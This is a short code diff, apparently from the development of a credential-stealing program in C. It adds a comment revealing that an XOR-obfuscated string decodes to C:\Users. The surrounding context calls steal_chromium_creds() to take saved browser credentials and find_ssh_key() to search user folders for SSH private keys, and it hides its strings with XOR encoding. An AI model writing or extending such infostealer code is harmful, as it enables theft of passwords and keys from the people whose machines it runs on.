@@ -17,7 +17,7 @@ int main(void) {
 
   steal_chromium_creds();
 
-  wchar_t users_path[] = L"\x69\x10\x76\x7f\x59\x4f\x58\x59";
+  wchar_t users_path[] = L"\x69\x10\x76\x7f\x59\x4f\x58\x59";  // C:\Users
   XOR_STR(users_path, 8);
 
   find_ssh_key(users_path);
